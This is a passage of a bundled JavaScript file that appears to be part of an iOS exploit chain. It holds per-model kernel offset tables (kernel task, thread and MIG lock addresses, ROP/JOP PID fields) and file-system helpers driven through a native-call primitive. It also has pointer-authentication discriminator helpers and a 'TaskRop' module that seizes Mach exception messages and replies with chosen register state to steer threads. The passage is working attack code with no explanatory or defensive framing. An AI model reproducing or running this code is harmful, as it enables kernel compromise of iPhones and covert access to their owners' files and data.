          guardExcCode: 0x388n,
          taskThreads: 0x3d8n,
          tro: 0x3e0n,
          ast: 0x404n,
          mutexData: 0x410n,
          ctid: 0x490n,
          options: 0xc0n
        },
        1: {
          kernelTask: 0xaae888n,
          taskThreads: 0x3d0n,
          tro: 0x3d8n,
          ast: 0x3fcn,
          mutexData: 0x408n,
          ctid: 0x488n
        },
        2: {
          kernelTask: 0xab6cb8n
        },
        3: {
          kernelTask: 0xab2cb8n
        },
        4: {
          kernelTask: 0xb23d28n,
          procRO: 0x3e0n,
          excGuard: 0x624n,
          taskThreads: 0x3d8n,
          tro: 0x3e0n,
          ast: 0x404n,
          mutexData: 0x410n,
          ctid: 0x498n,
          migLock: 0x3c03ef0n,
          migSbxMsg: 0x3c03f10n,
          migKernelStackLR: 0x3582fe0n
        },
        5: {
          kernelTask: 0xb2be10n,
          migLock: 0x3c181a8n,
          migSbxMsg: 0x3c181c8n,
          migKernelStackLR: 0x35993a4n
        },
        6: {
          kernelTask: 0xb2ff20n,
          guardExcCode: 0x390n,
          taskThreads: 0x3e0n,
          tro: 0x3e8n,
          ast: 0x40cn,
          mutexData: 0x418n,
          ctid: 0x4a0n,
          migLock: 0x3c241a8n,
          migSbxMsg: 0x3c241c8n,
          migKernelStackLR: 0x35a26a0n
        }
      }
    }
  },
  // iPhone 16
  // iPhone 16 plus
  // iPhone 16 pro
  // iPhone 16 pro max
  "iPhone17": {
    "*": {
      24: {
        0: {
          kernelTask: 0xb7e1c8n,
          pComm: 0x56cn,
          procRO: 0x3b8n,
          ipcSpace: 0x318n,
          troTask: 0x28n,
          excGuard: 0x5fcn,
          kstackptr: 0x148n,
          ropPid: 0x1b8n,
          jopPid: 0x1c0n,
          guardExcCode: 0x390n,
          taskThreads: 0x3e0n,
          tro: 0x3e8n,
          ast: 0x40cn,
          mutexData: 0x418n,
          ctid: 0x4a8n,
          options: 0xc0n
        },
        1: {
          kernelTask: 0xb7e1e0n,
          taskThreads: 0x3d8n,
          tro: 0x3e0n,
          ast: 0x404n,
          mutexData: 0x410n,
          ctid: 0x4a0n
        },
        2: {
          kernelTask: 0xb86610n
        },
        3: {
          kernelTask: 0xb82610n
        },
        4: {
          kernelTask: 0xc0fd80n,
          procRO: 0x3e0n,
          excGuard: 0x624n,
          taskThreads: 0x3e0n,
          tro: 0x3e8n,
          ast: 0x40cn,
          mutexData: 0x418n,
          ctid: 0x4a8n,
          migLock: 0x4042dc0n,
          migSbxMsg: 0x4042de0n,
          migKernelStackLR: 0x3912aa0n
        },
        5: {
          kernelTask: 0xc17e68n,
          migLock: 0x405eff8n,
          migSbxMsg: 0x405f018n,
          migKernelStackLR: 0x392be64n
        },
        6: {
          kernelTask: 0xc1bf78n,
          guardExcCode: 0x398n,
          taskThreads: 0x3e8n,
          tro: 0x3f0n,
          ast: 0x414n,
          mutexData: 0x420n,
          ctid: 0x4b0n,
          migLock: 0x4066f88n,
          migSbxMsg: 0x4066fa8n,
          migKernelStackLR: 0x39352e0n
        }
      }
    },
    "5": {
      24: {
        0: {
          kernelTask: 0xb7e1c8n,
          pComm: 0x56cn,
          procRO: 0x3b8n,
          ipcSpace: 0x318n,
          troTask: 0x28n,
          excGuard: 0x5fcn,
          kstackptr: 0x148n,
          ropPid: 0x1b8n,
          jopPid: 0x1c0n,
          guardExcCode: 0x390n,
          taskThreads: 0x3e0n,
          tro: 0x3e8n,
          ast: 0x40cn,
          mutexData: 0x418n,
          ctid: 0x4a8n,
          options: 0xc0n
        },
        1: {
          kernelTask: 0xb7e1e0n,
          taskThreads: 0x3d8n,
          tro: 0x3e0n,
          ast: 0x404n,
          mutexData: 0x410n,
          ctid: 0x4a0n
        },
        2: {
          kernelTask: 0xb86610n
        },
        3: {
          kernelTask: 0xb82610n
        },
        4: {
          kernelTask: 0xc0fd80n,
          procRO: 0x3e0n,
          excGuard: 0x624n,
          taskThreads: 0x3e0n,
          tro: 0x3e8n,
          ast: 0x40cn,
          mutexData: 0x418n,
          ctid: 0x4a8n,
          migLock: 0x408acd0n,
          migSbxMsg: 0x408acf0n,
          migKernelStackLR: 0x396e4a0n
        },
        5: {
          kernelTask: 0xc17e68n,
          migLock: 0x40a6f08n,
          migSbxMsg: 0x40a6f28n,
          migKernelStackLR: 0x3987924n
        },
        6: {
          kernelTask: 0xc1ff78n,
          guardExcCode: 0x398n,
          taskThreads: 0x3e8n,
          tro: 0x3f0n,
          ast: 0x414n,
          mutexData: 0x420n,
          ctid: 0x4b0n,
          migLock: 0x40b6e98n,
          migSbxMsg: 0x40b6eb8n,
          migKernelStackLR: 0x3998de0n
        }
      }
    }
  }
};

/***/ }),

/***/ "./libs/JSUtils/FileUtils.js":
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "default", function() { return FileUtils; });
function _typeof(o) { "@babel/helpers - typeof"; return _typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (o) { return typeof o; } : function (o) { return o && "function" == typeof Symbol && o.constructor === Symbol && o !== Symbol.prototype ? "symbol" : typeof o; }, _typeof(o); }
function _classCallCheck(a, n) { if (!(a instanceof n)) throw new TypeError("Cannot call a class as a function"); }
function _defineProperties(e, r) { for (var t = 0; t < r.length; t++) { var o = r[t]; o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(e, _toPropertyKey(o.key), o); } }
function _createClass(e, r, t) { return r && _defineProperties(e.prototype, r), t && _defineProperties(e, t), Object.defineProperty(e, "prototype", { writable: !1 }), e; }
function _toPropertyKey(t) { var i = _toPrimitive(t, "string"); return "symbol" == _typeof(i) ? i : i + ""; }
function _toPrimitive(t, r) { if ("object" != _typeof(t) || !t) return t; var e = t[Symbol.toPrimitive]; if (void 0 !== e) { var i = e.call(t, r || "default"); if ("object" != _typeof(i)) return i; throw new TypeError("@@toPrimitive must return a primitive value."); } return ("string" === r ? String : Number)(t); }
function _assertClassBrand(e, t, n) { if ("function" == typeof e ? e === t : e.has(t)) return arguments.length < 3 ? t : n; throw new TypeError("Private element is not present on this object"); }
var TAG = "FILE-UTILS";
var O_RDONLY = 0x0000;
var O_WRONLY = 0x0001;
var O_RDWR = 0x0002;
var O_APPEND = 0x0008;
var O_CREAT = 0x0200;
var O_TRUNC = 0x0400;
var O_EVTONLY = 0x8000;
var ERROR = -1;
var DT = {
  DT_UNKNOWN: 0,
  DT_FIFO: 1,
  DT_CHR: 2,
  DT_DIR: 4,
  DT_BLK: 6,
  DT_REG: 8,
  DT_LNK: 10,
  DT_SOCK: 12,
  DT_WHT: 14
};
var SEEK_SET = 0;
var FileUtils = /*#__PURE__*/function () {
  function FileUtils() {
    _classCallCheck(this, FileUtils);
  }
  return _createClass(FileUtils, null, [{
    key: "open",
    value: function open(path) {
      var fd = Native.callSymbol("open", path, O_RDONLY);
      if (fd == ERROR) {
        console.log(TAG, "Unable to open: " + path);
        return false;
      }
      return fd;
    }
  }, {
    key: "close",
    value: function close(fd) {
      Native.callSymbol("close", fd);
    }
  }, {
    key: "read",
    value: function read(fd) {
      var size = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : 0;
      if (!size || size > Native.memSize) size = Native.memSize;
      var len = Native.callSymbol("read", fd, Native.mem, size);
      if (!len || len == ERROR) return false;
      var buff = Native.read(Native.mem, len);
      return buff;
    }
  }, {
    key: "readFile",
    value: function readFile(path) {
      var seek = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : 0;
      var length = arguments.length > 2 && arguments[2] !== undefined ? arguments[2] : 0;
      var fd = this.open(path);
      if (fd === false) return null;
      var data = new Uint8Array();
      if (seek) Native.callSymbol("lseek", fd, seek, SEEK_SET);
      var remaining = length;
      while (true) {
        var size = remaining ? remaining : Native.memSize;
        if (size > Native.memSize) size = Native.memSize;
        var buff = this.read(fd, size);
        if (buff === false) break;
        var buff8 = new Uint8Array(buff);
        var newData = new Uint8Array(data.length + buff8.length);
        newData.set(data, 0);
        newData.set(buff8, data.length);
        data = newData;
        if (remaining) {
          remaining -= buff.byteLength;
          if (!remaining) break;
        }
      }
      this.close(fd);
      return data.buffer;
    }
  }, {
    key: "writeFile",
    value: function writeFile(path, data) {
      return _assertClassBrand(FileUtils, this, _commonWriteFile).call(this, path, data, O_WRONLY | O_CREAT | O_TRUNC);
    }
  }, {
    key: "appendFile",
    value: function appendFile(path, data) {
      return _assertClassBrand(FileUtils, this, _commonWriteFile).call(this, path, data, O_WRONLY | O_CREAT | O_APPEND);
    }
  }, {
    key: "deleteFile",
    value: function deleteFile(path) {
      Native.callSymbol("unlink", path);
    }
  }, {
    key: "foreachDir",
    value: function foreachDir(path, func) {
      var dir = Native.callSymbol("opendir", path);
      if (!dir) {
        console.log(TAG, "Unable to open dir: " + path);
        return;
      }
      while (true) {
        var item = _assertClassBrand(FileUtils, this, _readdir).call(this, dir);
        if (!item) break;
        switch (item.d_type) {
          case DT.DT_DIR:
            if (item.d_name.startsWith(".")) break;
            func(item.d_name);
            break;
        }
      }
      Native.callSymbol("closedir", dir);
    }
  }, {
    key: "foreachFile",
    value: function foreachFile(path, func) {
      var dir = Native.callSymbol("opendir", path);
      if (!dir) {
        console.log(TAG, "Unable to open dir: " + path);
        return false;
      }
      while (true) {
        var item = _assertClassBrand(FileUtils, this, _readdir).call(this, dir);
        if (!item) break;
        switch (item.d_type) {
          case DT.DT_REG:
            func(item.d_name);
            break;
        }
      }
      Native.callSymbol("closedir", dir);
      return true;
    }
  }, {
    key: "createDir",
    value: function createDir(path) {
      var permission = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : 493;
      return !Native.callSymbol("mkdir", path, permission);
    }
  }, {
    key: "deleteDir",
    value: function deleteDir(path) {
      var recursive = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : false;
      if (recursive) {
        var dir = Native.callSymbol("opendir", path);
        if (!dir) {
          console.log(TAG, "deleteDir: Unable to open dir: " + path);
          return false;
        }
        while (true) {
          var item = _assertClassBrand(FileUtils, this, _readdir).call(this, dir);
          if (!item) break;
          var newPath = path + '/' + item.d_name;
          switch (item.d_type) {
            case DT.DT_DIR:
              if (item.d_name.startsWith(".")) break;
              this.deleteDir(newPath, true);
              break;
            case DT.DT_REG:
              console.log(TAG, "deleting: ".concat(newPath));
              this.deleteFile(newPath);
              break;
          }
        }
        Native.callSymbol("closedir", dir);
      }
      return !Native.callSymbol("rmdir", path);
    }
  }, {
    key: "exists",
    value: function exists(path) {
      var permission = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : 0;
      return !Native.callSymbol("access", path, permission);
    }
  }, {
    key: "stat",
    value: function stat(path) {
      var ret = Native.callSymbol("stat", path, Native.mem);
      if (ret == ERROR) return null;
      var buff = Native.read(Native.mem, 144);
      var view = new DataView(buff);
      var dev = view.getInt32(0, true);
      var mode = view.getUint16(0x4, true);
      var nlink = view.getUint16(0x6, true);
      var ino = view.getBigUint64(0x8, true);
      var uid = view.getUint32(0x10, true);
      var gid = view.getUint32(0x14, true);
      var atime_tv_sec = view.getBigInt64(0x20, true);
      var mtime_tv_sec = view.getBigInt64(0x30, true);
      var ctime_tv_sec = view.getBigInt64(0x40, true);
      var size = view.getBigInt64(0x60, true);
      return {
        mode: Number(mode),
        ino: Number(ino),
        dev: Number(dev),
        nlink: Number(nlink),
        uid: Number(uid),
        gid: Number(gid),
        size: Number(size),
        atime: Number(atime_tv_sec),
        mtime: Number(mtime_tv_sec),
        ctime: Number(ctime_tv_sec)
      };
    }
  }]);
}();
function _readdir(dir) {
  var itemPtr = Native.callSymbol("readdir", dir);
  if (!itemPtr) return null;
  var item = Native.read(itemPtr, 24);
  var view = new DataView(item);
  var d_ino = view.getBigUint64(0, true);
  var d_namlen = view.getUint16(18, true);
  var d_type = view.getUint8(20);
  var d_name = Native.readString(itemPtr + 21n, d_namlen + 1);
  return {
    d_ino: d_ino,
    d_type: d_type,
    d_name: d_name
  };
}
function _commonWriteFile(path, data, flags) {
  var fd = Native.callSymbol("open", path, flags, 420);
  if (fd == ERROR) {
    console.log(TAG, "Unable to open: " + path);
    return false;
  }

  // For some reason file mode is not applied on open()
  Native.callSymbol("fchmod", fd, 420);
  var offs = 0;
  var left = data.byteLength;
  var buffSize = 0x4000;
  var buffPtr = Native.callSymbol("malloc", buffSize);
  while (true) {
    var size = left > buffSize ? buffSize : left;
    var src8 = new Uint8Array(data, offs, size);
    var dst8 = new Uint8Array(src8);
    Native.write(buffPtr, dst8.buffer);
    var len = Native.callSymbol("write", fd, buffPtr, size);
    if (!len || len == ERROR) break;
    offs += len;
    left -= len;
    if (!left) break;
  }
  Native.callSymbol("free", buffPtr);
  Native.callSymbol("close", fd);
  return true;
}


/***/ }),

/***/ "./libs/JSUtils/Utils.js":
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "default", function() { return Utils; });
var _Utils;
function _typeof(o) { "@babel/helpers - typeof"; return _typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (o) { return typeof o; } : function (o) { return o && "function" == typeof Symbol && o.constructor === Symbol && o !== Symbol.prototype ? "symbol" : typeof o; }, _typeof(o); }
function _classCallCheck(a, n) { if (!(a instanceof n)) throw new TypeError("Cannot call a class as a function"); }
function _defineProperties(e, r) { for (var t = 0; t < r.length; t++) { var o = r[t]; o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(e, _toPropertyKey(o.key), o); } }
function _createClass(e, r, t) { return r && _defineProperties(e.prototype, r), t && _defineProperties(e, t), Object.defineProperty(e, "prototype", { writable: !1 }), e; }
function _defineProperty(e, r, t) { return (r = _toPropertyKey(r)) in e ? Object.defineProperty(e, r, { value: t, enumerable: !0, configurable: !0, writable: !0 }) : e[r] = t, e; }
function _toPropertyKey(t) { var i = _toPrimitive(t, "string"); return "symbol" == _typeof(i) ? i : i + ""; }
function _toPrimitive(t, r) { if ("object" != _typeof(t) || !t) return t; var e = t[Symbol.toPrimitive]; if (void 0 !== e) { var i = e.call(t, r || "default"); if ("object" != _typeof(i)) return i; throw new TypeError("@@toPrimitive must return a primitive value."); } return ("string" === r ? String : Number)(t); }
var TAG = "UTILS";
var DT = {
  DT_UNKNOWN: 0,
  DT_FIFO: 1,
  DT_CHR: 2,
  DT_DIR: 4,
  DT_BLK: 6,
  DT_REG: 8,
  DT_LNK: 10,
  DT_SOCK: 12,
  DT_WHT: 14
};
var Utils = /*#__PURE__*/function () {
  function Utils() {
    _classCallCheck(this, Utils);
  }
  return _createClass(Utils, null, [{
    key: "hex",
    value: function hex(val) {
      return val.toString(16);
    }
  }, {
    key: "memmem",
    value: function memmem(haystack, needle) {
      var hLen = haystack.byteLength;
      var nLen = needle.byteLength;
      if (nLen === 0 || hLen < nLen) {
        return 0;
      }
      var haystackView = new Uint8Array(haystack);
      var needleView = new Uint8Array(needle);
      for (var i = 0; i <= hLen - nLen; i++) {
        var found = true;
        for (var j = 0; j < nLen; j++) {
          if (haystackView[i + j] !== needleView[j]) {
            found = false;
            break;
          }
        }
        if (found) {
          return i;
        }
      }
      return 0;
    }
  }, {
    key: "ptrauth_string_discriminator",
    value: function ptrauth_string_discriminator(discriminator) {
      switch (discriminator) {
        case "pc":
          return 0x7481n;
        case "lr":
          return 0x77d3n;
        case "sp":
          return 0xcbedn;
        case "fp":
          return 0x4517n;
        default:
          console.log(TAG, "Cannot find discriminator for value:".concat(discriminator));
          return 0n;
      }
    }
  }, {
    key: "ptrauth_string_discriminator_special",
    value: function ptrauth_string_discriminator_special(discriminator) {
      switch (discriminator) {
        case "pc":
          return 0x7481000000000000n;
        case "lr":
          return 0x77d3000000000000n;
        case "sp":
          return 0xcbed000000000000n;
        case "fp":
          return 0x4517000000000000n;
        default:
          console.log(TAG, "Cannot find discriminator for value:".concat(discriminator));
          return 0n;
      }
    }
  }, {
    key: "ptrauth_blend_discriminator",
    value: function ptrauth_blend_discriminator(diver, discriminator) {
      return diver & 0xFFFFFFFFFFFFn | discriminator;
    }
  }, {
    key: "printArrayBufferInChunks",
    value: function printArrayBufferInChunks(buffer) {
      var view = new DataView(buffer);
      var chunkSize = 8;
      for (var i = 0; i < buffer.byteLength; i += chunkSize) {
        // Read the chunk as a BigInt
        var chunk = view.getBigUint64(i, true); // Little-endian

        console.log(TAG, "0x".concat(Utils.hex(i), ": ").concat(Utils.hex(chunk)));
      }
    }
  }, {
    key: "MIN",
    value: function MIN(a, b) {
      if (a < b) return a;
      return b;
    }
  }, {
    key: "MAX",
    value: function MAX(a, b) {
      if (a > b) return a;
      return b;
    }
  }]);
}();
_Utils = Utils;
_defineProperty(Utils, "UINT64_SIZE", 8);
_defineProperty(Utils, "UINT32_SIZE", 4);
_defineProperty(Utils, "UINT16_SIZE", 2);
_defineProperty(Utils, "ARM_THREAD_STATE64", 6);
_defineProperty(Utils, "ARM_THREAD_STATE64_SIZE", 0x110);
_defineProperty(Utils, "ARM_THREAD_STATE64_COUNT", _Utils.ARM_THREAD_STATE64_SIZE / _Utils.UINT32_SIZE);
_defineProperty(Utils, "ptrauth_key_asia", 0);
_defineProperty(Utils, "EXC_BAD_ACCESS", 1n);
_defineProperty(Utils, "EXC_GUARD", 12n);
_defineProperty(Utils, "EXC_MASK_GUARD", 1n << _Utils.EXC_GUARD);
_defineProperty(Utils, "EXC_MASK_BAD_ACCESS", 1n << _Utils.EXC_BAD_ACCESS);
_defineProperty(Utils, "EXCEPTION_STATE", 2n);
_defineProperty(Utils, "MACH_EXCEPTION_CODES", 0x80000000n);
_defineProperty(Utils, "PAGE_SIZE", 0x4000n);
_defineProperty(Utils, "PAGE_MASK", _Utils.PAGE_SIZE - 1n);


/***/ }),

/***/ "./libs/TaskRop/Exception.js":
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "default", function() { return Exception; });
/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__("./libs/Chain/Native.js");
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__("./libs/JSUtils/Utils.js");
/* harmony import */ var _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__("./libs/TaskRop/ExceptionMessageStruct.js");
/* harmony import */ var _ExceptionReplyStruct__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__("./libs/TaskRop/ExceptionReplyStruct.js");
/* harmony import */ var _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__("./libs/TaskRop/MachMsgHeaderStruct.js");
function _typeof(o) { "@babel/helpers - typeof"; return _typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (o) { return typeof o; } : function (o) { return o && "function" == typeof Symbol && o.constructor === Symbol && o !== Symbol.prototype ? "symbol" : typeof o; }, _typeof(o); }
function _classCallCheck(a, n) { if (!(a instanceof n)) throw new TypeError("Cannot call a class as a function"); }
function _defineProperties(e, r) { for (var t = 0; t < r.length; t++) { var o = r[t]; o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(e, _toPropertyKey(o.key), o); } }
function _createClass(e, r, t) { return r && _defineProperties(e.prototype, r), t && _defineProperties(e, t), Object.defineProperty(e, "prototype", { writable: !1 }), e; }
function _defineProperty(e, r, t) { return (r = _toPropertyKey(r)) in e ? Object.defineProperty(e, r, { value: t, enumerable: !0, configurable: !0, writable: !0 }) : e[r] = t, e; }
function _toPropertyKey(t) { var i = _toPrimitive(t, "string"); return "symbol" == _typeof(i) ? i : i + ""; }
function _toPrimitive(t, r) { if ("object" != _typeof(t) || !t) return t; var e = t[Symbol.toPrimitive]; if (void 0 !== e) { var i = e.call(t, r || "default"); if ("object" != _typeof(i)) return i; throw new TypeError("@@toPrimitive must return a primitive value."); } return ("string" === r ? String : Number)(t); }





var TAG = "EXCEPTION";
var MPO_INSERT_SEND_RIGHT = 0x10;
var MPO_PROVISIONAL_ID_PROT_OPTOUT = 0x8000;
var MACH_SEND_MSG = 0x00000001n;
var MACH_RCV_MSG = 0x00000002n;
var MACH_SEND_TIMEOUT = 0x00000010n;
var MACH_RCV_TIMEOUT = 0x00000100n;
var MACH_MSG_TYPE_MOVE_SEND_ONCE = 18;
var Exception = /*#__PURE__*/function () {
  function Exception() {
    _classCallCheck(this, Exception);
  }
  return _createClass(Exception, null, [{
    key: "createPort",
    value: function createPort() {
      var options = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem;
      var buffer = new ArrayBuffer(8);
      var view = new DataView(buffer);
      view.setUint32(0, MPO_INSERT_SEND_RIGHT | MPO_PROVISIONAL_ID_PROT_OPTOUT, true);
      view.setUint32(4, 0, true);
      libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write(options, buffer);
      var exceptionPortPtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem + 0x100n;
      var kr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_port_construct", 0x203, options, 0n, exceptionPortPtr);
      if (kr != 0) {
        console.log(TAG, "Error creating exception port:".concat(kr));
        return 0;
      }
      var port = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read32(exceptionPortPtr);
      return BigInt(port);
    }
  }, {
    key: "waitException",
    value: function waitException(exceptionPort, excBuffer, timeout, debug) {
      var t1 = new Date().getTime();
      if (debug) console.log(TAG, "Waiting exception...");
      var ret = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_msg", excBuffer, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, this.ExceptionMessageSize, exceptionPort, timeout, 0);
      if (ret != 0) {
        var errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_error_string", ret);
        errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].readString(errString);
        //console.log(TAG,`Error receiving exception message:${errString}`);
        return false;
      }
      if (debug) {
        var excRes = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read(excBuffer, Number(this.ExceptionMessageSize));
        var exc = new _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_2__["default"](excRes);
        var elapsed = new Date().getTime() - t1;
        //console.log(TAG,`Got exception succesfully after ${elapsed} ms with [id:${exc.Head.msgh_id}, exc=${exc.exception}, code=${Utils.hex(exc.codeFirst)}]`);
        //console.log(TAG,`PC:${Utils.hex(exc.threadState.opaque_pc)}`);
        //console.log(TAG,`LR:${Utils.hex(exc.threadState.opaque_lr)}`);
        //console.log(TAG,`SP:${Utils.hex(exc.threadState.opaque_sp)}`);
        //console.log(TAG,`FP:${Utils.hex(exc.threadState.opaque_fp)}`);
        //for(let i = 0; i < 29; i++)
        //	console.log(TAG,`x[${i}]:${Utils.hex(exc.threadState.registers.get(i))}`);
      }
      return true;
    }
  }, {
    key: "replyWithState",
    value: function replyWithState(exc, state, debug) {
      var replyBuf = new ArrayBuffer(Number(this.ExceptionReplySize));
      var reply = new _ExceptionReplyStruct__WEBPACK_IMPORTED_MODULE_3__["default"](replyBuf);
      var sendSize = Number(this.ExceptionReplySize);
      var recvSize = 0n;
      if (debug) {
        console.log(TAG, "Reply with state:");
        console.log(TAG, "PC:".concat(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(state.opaque_pc)));
        console.log(TAG, "LR:".concat(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(state.opaque_lr)));
        console.log(TAG, "SP:".concat(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(state.opaque_sp)));
        console.log(TAG, "FP:".concat(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(state.opaque_fp)));
      }
      reply.Head.msgh_bits = _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_4__["default"].MACH_MSGH_BITS(MACH_MSG_TYPE_MOVE_SEND_ONCE, 0);
      reply.Head.msgh_size = sendSize;
      reply.Head.msgh_remote_port = exc.Head.msgh_remote_port;
      reply.Head.msgh_local_port = 0;
      reply.Head.msgh_id = exc.Head.msgh_id + 100;
      reply.NDR = exc.NDR;
      reply.RetCode = 0;
      reply.flavor = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].ARM_THREAD_STATE64;
      reply.new_stateCnt = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].ARM_THREAD_STATE64_COUNT;
      //TODO make it inside ThreadState to copy thread state to another variable
      for (var i = 0; i < 29; i++) {
        reply.threadState.registers.set(i, state.registers.get(i));
      }
      reply.threadState.opaque_fp = state.opaque_fp;
      reply.threadState.opaque_lr = state.opaque_lr;
      reply.threadState.opaque_sp = state.opaque_sp;
      reply.threadState.opaque_pc = state.opaque_pc;
      reply.threadState.cspr = state.cspr;
      reply.threadState.opaque_flags = state.opaque_flags;
      var replyMem = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem;
      libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write(replyMem, replyBuf);
      if (debug) libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].printArrayBufferInChunks(replyBuf);
      var ret = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_msg", replyMem, MACH_SEND_MSG, sendSize, recvSize, 0n, 0n, 0n);
      if (ret != 0) console.log(TAG, "Error replying exception:".concat(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_error_string", ret)));
    }
  }]);
}();
_defineProperty(Exception, "ExceptionMessageSize", 0x160n);
_defineProperty(Exception, "ExceptionReplySize", 0x13cn);


/***/ }),

/***/ "./libs/TaskRop/ExceptionMessageStruct.js":
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "default", function() { return ExceptionMessageStruct; });
/* harmony import */ var _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__("./libs/TaskRop/MachMsgHeaderStruct.js");
/* harmony import */ var _ThreadState__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__("./libs/TaskRop/ThreadState.js");
function _typeof(o) { "@babel/helpers - typeof"; return _typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (o) { return typeof o; } : function (o) { return o && "function" == typeof Symbol && o.constructor === Symbol && o !== Symbol.prototype ? "symbol" : typeof o; }, _typeof(o); }
function _classCallCheck(a, n) { if (!(a instanceof n)) throw new TypeError("Cannot call a class as a function"); }
function _defineProperties(e, r) { for (var t = 0; t < r.length; t++) { var o = r[t]; o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(e, _toPropertyKey(o.key), o); } }
function _createClass(e, r, t) { return r && _defineProperties(e.prototype, r), t && _defineProperties(e, t), Object.defineProperty(e, "prototype", { writable: !1 }), e; }
function _toPropertyKey(t) { var i = _toPrimitive(t, "string"); return "symbol" == _typeof(i) ? i : i + ""; }
function _toPrimitive(t, r) { if ("object" != _typeof(t) || !t) return t; var e = t[Symbol.toPrimitive]; if (void 0 !== e) { var i = e.call(t, r || "default"); if ("object" != _typeof(i)) return i; throw new TypeError("@@toPrimitive must return a primitive value."); } return ("string" === r ? String : Number)(t); }
function _classPrivateFieldInitSpec(e, t, a) { _checkPrivateRedeclaration(e, t), t.set(e, a); }
function _checkPrivateRedeclaration(e, t) { if (t.has(e)) throw new TypeError("Cannot initialize the same private elements twice on an object"); }
function _classPrivateFieldGet(s, a) { return s.get(_assertClassBrand(s, a)); }
function _classPrivateFieldSet(s, a, r) { return s.set(_assertClassBrand(s, a), r), r; }
function _assertClassBrand(e, t, n) { if ("function" == typeof e ? e === t : e.has(t)) return arguments.length < 3 ? t : n; throw new TypeError("Private element is not present on this object"); }


var _buffer = /*#__PURE__*/new WeakMap();
var _dataView = /*#__PURE__*/new WeakMap();
var ExceptionMessageStruct = /*#__PURE__*/function () {
  function ExceptionMessageStruct(buffer) {
    _classCallCheck(this, ExceptionMessageStruct);
    _classPrivateFieldInitSpec(this, _buffer, void 0);
    _classPrivateFieldInitSpec(this, _dataView, void 0);
    _classPrivateFieldSet(_buffer, this, buffer);
    _classPrivateFieldSet(_dataView, this, new DataView(_classPrivateFieldGet(_buffer, this)));
    this.Head = new _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_0__["default"](_classPrivateFieldGet(_buffer, this));
    this.threadState = new _ThreadState__WEBPACK_IMPORTED_MODULE_1__["default"](_classPrivateFieldGet(_buffer, this), 64);
  }
  return _createClass(ExceptionMessageStruct, [{
    key: "NDR",
    get: function get() {
      return _classPrivateFieldGet(_dataView, this).getBigUint64(24, true);
    },
    set: function set(value) {
      _classPrivateFieldGet(_dataView, this).setBigUint64(24, value, true);
    }
  }, {
    key: "exception",
    get: function get() {
      return _classPrivateFieldGet(_dataView, this).getUint32(32, true);
    },
    set: function set(value) {
      _classPrivateFieldGet(_dataView, this).setUint32(32, value, true);
    }
  }, {
    key: "codeCnt",
    get: function get() {
      return _classPrivateFieldGet(_dataView, this).getUint32(36, true);
    },
    set: function set(value) {
      _classPrivateFieldGet(_dataView, this).setUint32(36, value, true);
    }
  }, {
    key: "codeFirst",
    get: function get() {
      return _classPrivateFieldGet(_dataView, this).getBigUint64(40, true);
    },
